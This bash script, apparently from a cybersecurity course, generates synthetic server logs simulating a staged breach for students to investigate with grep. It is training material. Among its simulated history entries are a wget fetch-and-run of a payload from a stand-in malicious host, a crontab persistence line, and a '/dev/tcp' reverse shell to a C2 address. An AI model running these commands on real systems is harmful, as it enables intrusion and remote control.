#!/bin/bash

set -euo pipefail

usage() {
	cat <<'EOF'
Usage: ./advanced_breach_generator.sh [output_dir] [--tier intro|intermediate|advanced|final]

Examples:
  ./advanced_breach_generator.sh
  ./advanced_breach_generator.sh /tmp/course-logs --tier advanced
  ./advanced_breach_generator.sh --tier final
EOF
}

BASE_DIR="$HOME/bash-cyber-course/logs"
TIER="intro"

while [ "$#" -gt 0 ]; do
	case "$1" in
		--tier)
			if [ "$#" -lt 2 ]; then
				echo "[ERROR] Missing value for --tier" >&2
				usage
				exit 1
			fi
			TIER="$2"
			shift 2
			;;
		-h|--help)
			usage
			exit 0
			;;
		-*)
			echo "[ERROR] Unknown option: $1" >&2
			usage
			exit 1
			;;
		*)
			BASE_DIR="$1"
			shift
			;;
	esac
done

case "$TIER" in
	intro)
		AUTH_BACKGROUND_LINES=80000
		ACCESS_BACKGROUND_LINES=70000
		SYS_BACKGROUND_LINES=30000
		HISTORY_BACKGROUND_LINES=12000
		NET_BACKGROUND_LINES=70000
		ESTIMATED_SIZE="10-20 MB"
		;;
	intermediate)
		AUTH_BACKGROUND_LINES=220000
		ACCESS_BACKGROUND_LINES=180000
		SYS_BACKGROUND_LINES=80000
		HISTORY_BACKGROUND_LINES=30000
		NET_BACKGROUND_LINES=180000
		ESTIMATED_SIZE="30-50 MB"
		;;
	advanced)
		AUTH_BACKGROUND_LINES=360000
		ACCESS_BACKGROUND_LINES=300000
		SYS_BACKGROUND_LINES=140000
		HISTORY_BACKGROUND_LINES=50000
		NET_BACKGROUND_LINES=300000
		ESTIMATED_SIZE="55-65 MB"
		;;
	final)
		AUTH_BACKGROUND_LINES=460000
		ACCESS_BACKGROUND_LINES=380000
		SYS_BACKGROUND_LINES=180000
		HISTORY_BACKGROUND_LINES=65000
		NET_BACKGROUND_LINES=380000
		ESTIMATED_SIZE="70-80 MB"
		;;
	*)
		echo "[ERROR] Invalid tier: ${TIER}" >&2
		usage
		exit 1
		;;
esac

AUTH_LOG="${BASE_DIR}/auth.log"
ACCESS_LOG="${BASE_DIR}/access.log"
SYS_LOG="${BASE_DIR}/syslog"
HISTORY_LOG="${BASE_DIR}/bash_history.log"
NET_LOG="${BASE_DIR}/network.log"

ATTACKER_IP="185.220.101.4"
SECONDARY_IP="91.134.14.73"
C2_IP="45.77.88.2"
LATERAL_IP="10.0.0.15"
COMPROMISED_USER="admin"

echo "[+] Generating advanced breach logs in ${BASE_DIR}"
echo "[+] Tier selected: ${TIER} (~${ESTIMATED_SIZE})"

mkdir -p "${BASE_DIR}"

: > "${AUTH_LOG}"
: > "${ACCESS_LOG}"
: > "${SYS_LOG}"
: > "${HISTORY_LOG}"
: > "${NET_LOG}"

echo "[+] Stage 0/10: Generating normal background activity"

for ((i=1; i<=AUTH_BACKGROUND_LINES; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	printf 'Jul 10 08:%02d:%02d server sshd[%d]: Failed password for root from %s port %d ssh2\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" "$ip" "$RANDOM" >> "${AUTH_LOG}"
done

for ((i=1; i<=ACCESS_BACKGROUND_LINES; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	printf '%s - - [10/Jul/2024:08:%02d:%02d] "GET /index.html HTTP/1.1" 200\n' \
		"$ip" "$((RANDOM % 60))" "$((RANDOM % 60))" >> "${ACCESS_LOG}"
done

for ((i=1; i<=SYS_BACKGROUND_LINES; i++)); do
	printf 'Jul 10 08:%02d:%02d server systemd[%d]: Started user service\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" >> "${SYS_LOG}"
done

for ((i=1; i<=HISTORY_BACKGROUND_LINES; i++)); do
	printf 'ls\ncd /var/www\ncat /var/log/auth.log\n' >> "${HISTORY_LOG}"
done

for ((i=1; i<=NET_BACKGROUND_LINES; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	printf 'Connection from %s to 192.168.1.1:443\n' "$ip" >> "${NET_LOG}"
done

echo "[+] Stage 1/10: SSH brute force"
for ((i=1; i<=450; i++)); do
	printf 'Jul 10 09:%02d:%02d server sshd[%d]: Failed password for %s from %s port %d ssh2\n' \
		"$((RANDOM % 10))" "$((RANDOM % 60))" "$RANDOM" "$COMPROMISED_USER" "$ATTACKER_IP" "$RANDOM" >> "${AUTH_LOG}"
done

echo "[+] Stage 2/10: Successful compromise"
cat >> "${AUTH_LOG}" <<EOF
Jul 10 09:16:10 server sshd[1426]: Accepted password for ${COMPROMISED_USER} from ${ATTACKER_IP} port 45518 ssh2
Jul 10 09:18:11 server sshd[1430]: session opened for user ${COMPROMISED_USER}
EOF

echo "[+] Stage 3/10: Privilege escalation"
cat >> "${HISTORY_LOG}" <<EOF
sudo su -
whoami
id
EOF
echo "Jul 10 09:17:02 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/su -" >> "${SYS_LOG}"

echo "[+] Stage 4/10: Malware download"
cat >> "${HISTORY_LOG}" <<EOF
wget http://malicious.site/payload.sh
chmod +x payload.sh
./payload.sh
EOF
echo "Jul 10 09:18:11 server kernel: outbound connection to ${C2_IP}" >> "${SYS_LOG}"

echo "[+] Stage 5/10: Persistence"
echo "echo '* * * * * /tmp/payload.sh' >> /etc/crontab" >> "${HISTORY_LOG}"
echo "Jul 10 09:19:11 server CRON[1500]: (root) CMD (/tmp/payload.sh)" >> "${SYS_LOG}"

echo "[+] Stage 6/10: Web reconnaissance and data targeting"
cat >> "${ACCESS_LOG}" <<EOF
${ATTACKER_IP} - - [10/Jul/2024:09:19:01] "GET /admin HTTP/1.1" 200
${ATTACKER_IP} - - [10/Jul/2024:09:19:02] "GET /config HTTP/1.1" 403
${ATTACKER_IP} - - [10/Jul/2024:09:19:03] "GET /.env HTTP/1.1" 403
${ATTACKER_IP} - - [10/Jul/2024:09:22:12] "GET /backup.zip HTTP/1.1" 200
${SECONDARY_IP} - - [10/Jul/2024:09:20:12] "GET /login HTTP/1.1" 404
EOF

echo "[+] Stage 7/10: Lateral movement"
echo "ssh root@${LATERAL_IP}" >> "${HISTORY_LOG}"
echo "Jul 10 09:20:01 server sshd[1550]: Accepted password for root from 192.168.1.10 port 55433 ssh2" >> "${SYS_LOG}"

echo "[+] Stage 8/10: Reverse shell"
echo "bash -i >& /dev/tcp/${C2_IP}/4444 0>&1" >> "${HISTORY_LOG}"
echo "Jul 10 09:21:15 server kernel: suspicious outbound connection to ${C2_IP}:4444" >> "${SYS_LOG}"
echo "Connection from 192.168.1.5 to ${C2_IP}:4444" >> "${NET_LOG}"

echo "[+] Stage 9/10: Cleanup attempts"
echo "history -c" >> "${HISTORY_LOG}"
echo "Jul 10 09:23:01 server bash: history cleared" >> "${SYS_LOG}"

echo "[+] Stage 10/10: Breach dataset complete"

echo
echo "Generated logs:"
echo "- ${AUTH_LOG}"
echo "- ${ACCESS_LOG}"
echo "- ${HISTORY_LOG}"
echo "- ${SYS_LOG}"
echo "- ${NET_LOG}"
echo
echo "Approximate combined log footprint: ${ESTIMATED_SIZE}"
echo
echo "Suggested validation commands:"
echo "grep 'Failed password' ${AUTH_LOG} | awk '{print \$11}' | sort | uniq -c | sort -nr | head"
echo "grep 'Accepted password' ${AUTH_LOG}"
echo "grep -E 'wget|/dev/tcp|history -c' ${HISTORY_LOG}"
echo "grep -E 'CRON|outbound connection' ${SYS_LOG}"